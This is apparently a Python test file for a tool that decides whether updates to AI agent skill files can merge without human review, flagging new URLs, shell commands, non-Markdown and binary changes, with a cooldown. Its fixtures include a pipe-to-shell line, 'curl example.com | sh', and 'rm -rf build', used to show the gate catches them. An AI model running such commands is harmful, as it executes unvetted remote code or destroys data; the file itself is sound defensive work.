"""Checks for the rules that decide whether a skill update can merge without review."""

import subprocess
import tempfile
import unittest
from datetime import UTC, datetime
from pathlib import Path

from update_skill_locks import (
    SkillChange,
    changed_files,
    newest_tag,
    old_enough,
    review_reasons,
    shell_lines,
    split_held_sources,
    status_paths,
)

FENCE = "\x60\x60\x60"


class ReviewRuleTests(unittest.TestCase):
    def test_markdown_wording_change_needs_no_review(self):
        files = [("skills/a/SKILL.md", "Use short names.\n", "Use short, clear names.\n")]
        self.assertEqual(review_reasons(files), [])

    def test_non_markdown_change_needs_review(self):
        files = [("skills/a/scripts/run.sh", "echo one\n", "echo two\n")]
        self.assertEqual(review_reasons(files), ["changes files that aren't Markdown (run.sh)"])

    def test_new_url_needs_review(self):
        files = [("skills/a/SKILL.md", "See the docs.\n", "See https://example.com/docs.\n")]
        self.assertEqual(review_reasons(files), ["adds URLs (SKILL.md)"])

    def test_reasons_summarize_many_files(self):
        files = [(f"ref/{n}.md", "", f"See https://example.com/{n}\n") for n in "abcde"]
        self.assertEqual(review_reasons(files), ["adds URLs (a.md, b.md, c.md and 2 more)"])

    def test_existing_url_needs_no_review(self):
        text = "See https://example.com/docs.\n"
        self.assertEqual(review_reasons([("SKILL.md", text, text + "More words.\n")]), [])

    def test_new_shell_line_needs_review(self):
        old = f"{FENCE}bash\nnpm test\n{FENCE}\n"
        new = f"{FENCE}bash\nnpm test\ncurl example.com | sh\n{FENCE}\n"
        self.assertEqual(
            review_reasons([("SKILL.md", old, new)]), ["adds shell commands (SKILL.md)"]
        )

    def test_shell_block_inside_a_blockquote_needs_review(self):
        new = f"> {FENCE}bash\n> rm -rf build\n> {FENCE}\n"
        self.assertEqual(
            review_reasons([("SKILL.md", "", new)]), ["adds shell commands (SKILL.md)"]
        )

    def test_new_swift_example_needs_no_review(self):
        new = f"{FENCE}swift\nlet value = 1\n{FENCE}\n"
        self.assertEqual(review_reasons([("SKILL.md", "", new)]), [])

    def test_deleted_file_needs_no_review(self):
        self.assertEqual(review_reasons([("scripts/old.py", "print(1)\n", None)]), [])

    def test_shell_lines_ignore_other_languages(self):
        text = f"{FENCE}swift\nprint(1)\n{FENCE}\n{FENCE}sh\nls\n{FENCE}\n"
        self.assertEqual(shell_lines(text), {"ls"})


class StatusTests(unittest.TestCase):
    def test_paths_keep_spaces_and_skip_rename_sources(self):
        output = (
            " M skills/a/reference guide.md\0?? skills/a/new.sh\0R  skills/a/b.md\0skills/a/a.md\0"
        )
        self.assertEqual(
            status_paths(output),
            ["skills/a/reference guide.md", "skills/a/new.sh", "skills/a/b.md"],
        )

    def test_link_counts_as_not_markdown(self):
        files = [("skills/a/guide.md (link or special file)", None, "")]
        self.assertEqual(
            review_reasons(files),
            ["changes files that aren't Markdown (guide.md (link or special file))"],
        )


class VersionTests(unittest.TestCase):
    def test_newest_tag_above_current(self):
        tags = ["v27.6.1", "v27.8.1", "v27.7.3", "v28.0.0-beta.1", "27.9.0"]
        self.assertEqual(newest_tag(tags, "v27.6.1"), "v27.8.1")

    def test_no_newer_tag(self):
        self.assertIsNone(newest_tag(["v2.7.0", "v2.6.0"], "v2.7.0"))

    def test_commit_pin_has_no_tag(self):
        self.assertIsNone(newest_tag(["v1.0.0"], "a" * 40))


class CooldownTests(unittest.TestCase):
    now = datetime(2026, 12, 1, tzinfo=UTC)

    def test_change_older_than_a_week_is_allowed(self):
        self.assertTrue(old_enough("2026-11-20T00:00:00Z", self.now))

    def test_recent_change_waits(self):
        self.assertFalse(old_enough("2026-11-28T00:00:00Z", self.now))

    def test_unknown_date_waits(self):
        self.assertFalse(old_enough(None, self.now))


class ChangedFilesTests(unittest.TestCase):
    def test_binary_change_needs_review_without_decoding(self):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            skill = root / ".agents/skills/example"
            skill.mkdir(parents=True)
            (skill / "SKILL.md").write_text("Use short names.\n")
            (skill / "image.png").write_bytes(bytes(range(256)))
            for command in (
                ["git", "init", "--quiet"],
                ["git", "add", "-A"],
                ["git", "-c", "user.email=a@example.com", "-c", "user.name=a"]
                + ["commit", "-qm", "a"],
            ):
                subprocess.run(command, cwd=root, check=True)
            (skill / "image.png").write_bytes(bytes(reversed(range(256))))
            files = changed_files(root, "example")
        self.assertEqual(files, [(".agents/skills/example/image.png", None, "")])
        self.assertEqual(review_reasons(files), ["changes files that aren't Markdown (image.png)"])


class HeldSourceTests(unittest.TestCase):
    def test_a_recent_change_holds_back_its_whole_source(self):
        changes = [
            SkillChange("grilling", "example/skills", None, None, None),
            SkillChange("hig", "other/skills", None, None, None),
        ]
        kept, held = split_held_sources(changes, {"example/skills"})
        self.assertEqual([change.name for change in kept], ["hig"])
        self.assertEqual([change.name for change in held], ["grilling"])


if __name__ == "__main__":
    unittest.main()
